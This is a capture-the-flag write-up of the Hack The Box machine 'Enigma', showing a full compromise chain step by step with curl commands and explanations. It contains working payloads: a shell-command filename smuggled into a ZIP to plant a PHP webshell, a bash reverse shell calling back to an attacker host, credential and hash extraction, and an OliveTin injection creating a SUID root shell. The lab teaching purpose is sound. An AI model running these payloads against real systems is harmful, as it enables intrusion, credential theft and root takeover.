# HTB Enigma — Full Writeup

**Difficulty:** Easy | **OS:** Linux | **Tools used:** curl only (no Metasploit, no Burp, no browser)

> **Machine:**   Enigma
> **Difficulty:** Easy  
> **Platform:** Hack The Box  
> **Date:** 11th May 2026  
> **Prepared By:** ****  
> **Machine Author(s):*****   

---

## 📋 Chain Overview

Enigma is built around a realistic corporate scenario (Enigma Corp) involving:
1. An open **NFS share** leaking new-employee onboarding info
2. **Password reuse** across different accounts
3. **Command injection** in OpenSTAManager (a real open-source web app)
4. **Leaked credentials** inside config files
5. A second **command injection** in OliveTin (a remote-management tool) leading to root

This kind of multi-step exploitation is called **"chain exploitation"** — each step gives you a piece of information or a privilege that unlocks the next step.

---

## Stage 1: NFS Discovery and Information Leak

### Command:
```bash
mkdir /tmp/nfs_mount
mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /tmp/nfs_mount -o nolock
pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -
```

### Explanation:
**NFS (Network File System)** is a protocol for sharing files over a network — think of it like a "shared USB drive" between machines. The issue here is a **misconfiguration**: the share was open with no authentication at all — anyone could `mount` it with no username or password.

Inside, we found a PDF containing onboarding info for a new employee (Kevin), including his email username and password.

**The vulnerability:** Exposed NFS Share (an NFS service exposed with no access control) — a common real-world misconfiguration, not a bug in NFS itself.

---

## Stage 2: Mail Access via IMAP

### Command:
```bash
curl -s --url "imaps://<TARGET_IP>/" --user "kevin:Enigma2024!" -k
curl -s --url "imaps://<TARGET_IP>/INBOX/;MAILINDEX=1" --user "kevin:Enigma2024!" -k
```

### Explanation:
Instead of using a web interface (Roundcube webmail), we used `curl` to talk directly to the **IMAP** protocol (a mail-reading protocol). This is much lighter and doesn't require a browser.

Inside Kevin's mailbox, we found a welcome email from an employee named **Sarah** in the Accounts department — this gave us a new username to try.

### Command (testing password reuse):
```bash
curl -s --url "imaps://<TARGET_IP>/" --user "sarah:Enigma2024!" -k
curl -s --url "imaps://<TARGET_IP>/INBOX/;MAILINDEX=1" --user "sarah:Enigma2024!" -k
```

### Explanation:
We tried Kevin's **exact same** password (`Enigma2024!`) against the username `sarah` — and it worked! This is called **Password Reuse**. In real companies this happens a lot: one "onboarding" default password gets handed out to multiple employees and nobody changes it.

Inside Sarah's inbox, we found an email from IT containing full admin credentials for a business application (OpenSTAManager):
```
Username: admin
Password: Ne3s4rtars78s
```

---

## Stage 3: Logging into OpenSTAManager

### Command:
```bash
curl -v -c cookies.txt --resolve support_001.enigma.htb:80:<TARGET_IP> \
  -d "username=admin&password=Ne3s4rtars78s" \
  http://support_001.enigma.htb/?op=login
```

### Explanation:
- `--resolve` makes curl resolve the hostname directly to an IP, as an alternative to editing `/etc/hosts`
- `-c cookies.txt` saves the session cookie so we can reuse it on later requests (staying "logged in")
- The response `302 Found` with `Location: /controller.php` confirmed the login succeeded

**Note:** OpenSTAManager is a real open-source app for e-invoicing and business management, used by real companies (especially in Italy).

---

## Stage 4: Command Injection via File Upload (CVE)

This is the most important vulnerability in the whole chain, and worth understanding well.

### Understanding the bug first:

OpenSTAManager has an "Import ZIP" feature (for importing electronic invoices as ZIP files). The app extracts files from the ZIP and uses the **filename** directly inside a shell command, without sanitizing it.

That means if a filename inside the ZIP contains special shell characters like `;` or `"`, those characters get executed as real shell commands instead of being treated as plain text.

### Building the exploit:
```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('/root/exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

### Detailed explanation:
The filename we built is:
```
invoice.p7m";cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php;echo ".p7m
```

When the app tries to use this filename inside a shell command (something like `mv "invoice.p7m" ...`), the `"` breaks out of the string, and a new command appears:
```bash
cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php
```

This command moves into the `files/` directory and writes a small PHP file called `SHELL.php` containing:
```php
<?php system($_GET['c']); ?>
```
This PHP code accepts a `c` parameter from the URL and executes it as a system command — meaning anyone who visits `SHELL.php?c=<command>` gets that command executed on the server.

### Uploading the file:
```bash
curl -v -b cookies.txt --resolve support_001.enigma.htb:80:<TARGET_IP> \
  -F "op=restore" \
  -F "blob=@/root/exploit.zip;type=application/zip" \
  "http://support_001.enigma.htb/actions.php?id_module=7"
```

- `-F` builds a multipart/form-data request (like a browser file upload)
- `op=restore` and `blob` are the field names we discovered by reading the HTML of the Backup page

### Confirming success:
```bash
curl -s --resolve support_001.enigma.htb:80:<TARGET_IP> \
  "http://support_001.enigma.htb/files/SHELL.php?c=id"
```
**Result:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)` ✅

**Vulnerability type:** Filename-based Command Injection — also known as **Arbitrary File Write leading to RCE**.

---

## Stage 5: Getting a Full Reverse Shell

### Command (in a second terminal, listener):
```bash
nc -lvnp 4444
```

### Command (sending the payload):
```bash
curl -s "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'" \
  --resolve support_001.enigma.htb:80:<TARGET_IP>
```

### Explanation:
The webshell (`SHELL.php?c=id`) lets us run one command at a time and see the output, but it's not practical for sustained work. A **Reverse Shell** is a technique where the target server "connects back" to us (instead of us connecting to it), giving us a full interactive terminal.

- `nc -lvnp 4444` puts our machine into "listening" mode on port 4444
- The payload tells the server: open an interactive bash and pipe it into a connection to our IP and port
- `/dev/tcp/...` is a bash feature that opens a raw TCP connection without needing netcat on the target

Once the server executes this, it "calls back" to us, and we land in a real shell as `www-data`.

---

## Stage 6: Discovering Database Credentials

### Command:
```bash
cat /var/www/html/openstamanager/config.inc.php
```

### Explanation:
Web app config files very often contain database credentials in plaintext. It's poor security practice, but extremely common in real applications.

We found:
```
db_username = 'brollin'
db_password = 'Fri3nds@9099'
```

### Extracting password hashes:
```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username, password FROM zz_users;"
```

**Result:**
```
admin: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

These are **bcrypt hashes** — one-way encryption of passwords. To recover the original password, you'd normally "crack" them with tools like `hashcat` against a wordlist (e.g. rockyou.txt). This process can take a long time depending on hardware.

---

## Stage 7: Pivoting to a System User (haris)

### Command:
```bash
printf 'bestfriends\n' | su haris -c 'id'
```

### Explanation:
Many systems (especially ones using **Dovecot** or PAM with `auth-system`) tie the application's password to the actual Linux user password. This means the password `haris` used inside OpenSTAManager was the same one for his Linux login on the server.

`su haris -c 'id'` switches to the `haris` user and runs a single command (`id`) with his privileges. `printf 'bestfriends\n' |` feeds the password automatically instead of typing it manually each time.

**Result:** `uid=1000(haris)` ✅ — this got us the **User Flag**:
```bash
printf 'bestfriends\n' | su haris -c 'cat haris/user.txt'
```

---

## Stage 8: Privilege Escalation via OliveTin (Root)

This is the most critical vulnerability on the box.

### Understanding OliveTin:
OliveTin is an app that provides a simple web UI for running predefined shell commands — like a set of "buttons" that each trigger a script. The catch: this instance was running as **root**, and was bound only to `127.0.0.1:1337` (not reachable from the internet, only from within the server itself).

### The bug in the config:
```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_pass
      type: password
```

Notice: `{{ db_pass }}` gets inserted directly inside the shell command's single quotes (`'...'`) **with no sanitization at all**. This is called an **Unsanitized Template Injection**, or **Shell Command Injection via Template**.

### Building the payload:
```
x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
```

### Detailed explanation:
If we submit this string as `db_pass`, the final command that runs becomes:
```bash
mysqldump -u backup_svc -p'x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #' production > ...
```

How it works:
1. `-p'x'` — closes the quote early; `mysqldump` fails with a bad password (irrelevant to us)
2. `;` — starts a **brand new, separate command**
3. `cp /bin/bash /tmp/rootbash` — copies bash into a new file
4. `chmod 4755 /tmp/rootbash` — sets the **SUID bit** (the leading `4`) on the file, so anyone who runs it gets the privileges of the file's **owner** (root, since OliveTin runs as root)
5. `#` — turns the rest of the original command into a comment so there's no syntax error

### Executing the exploit via the API:
```bash
curl -s -X POST http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d '{"actionId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'"'"'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #"},
    {"name":"db_name","value":"production"}
  ]}'
```

### Verifying:
```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1446024 ... /tmp/rootbash
```

The `s` instead of `x` in `rws` confirms the SUID bit is set, and the owner is `root`.

### Getting root:
```bash
/tmp/rootbash -p -c "id; cat /root/root.txt"
```

The `-p` flag tells bash to "preserve" elevated privileges instead of dropping them automatically, which is bash's default safety behavior.

**Result:** `uid=0(root)` — Root flag obtained ✅

---

## 🎯 Summary of Vulnerabilities Exploited

| # | Vulnerability | Type | Impact |
|---|---|---|---|
| 1 | NFS share with no authentication | Misconfiguration | Information disclosure |
| 2 | Password reuse | Weak Credential Management | Access to second account |
| 3 | Filename-based command injection | CWE-78 (OS Command Injection) | RCE as www-data |
| 4 | Config file with plaintext credentials | Sensitive Data Exposure | Database access |
| 5 | Shared password (app + Linux user) | Weak Credential Management | System user access |
| 6 | Unsanitized shell template (`db_pass`) | CWE-78 (OS Command Injection) | Privilege escalation to root |

---

## 💡 Key Takeaways

1. **Always try password reuse** — any password you find, test it against every other discovered account
2. **Read the source code / config files** — the OliveTin bug was only found by reading the YAML config
3. **Filename injection** is a common bug class in apps that extract ZIP files — always be suspicious of how an app handles filenames
4. **The SUID bash trick** (`cp /bin/bash; chmod 4755`) is a classic privilege escalation technique, useful anywhere you have command injection running with elevated privileges
5. **curl alone is enough** to exploit the vast majority of scenarios — you rarely need heavy tools or a browser
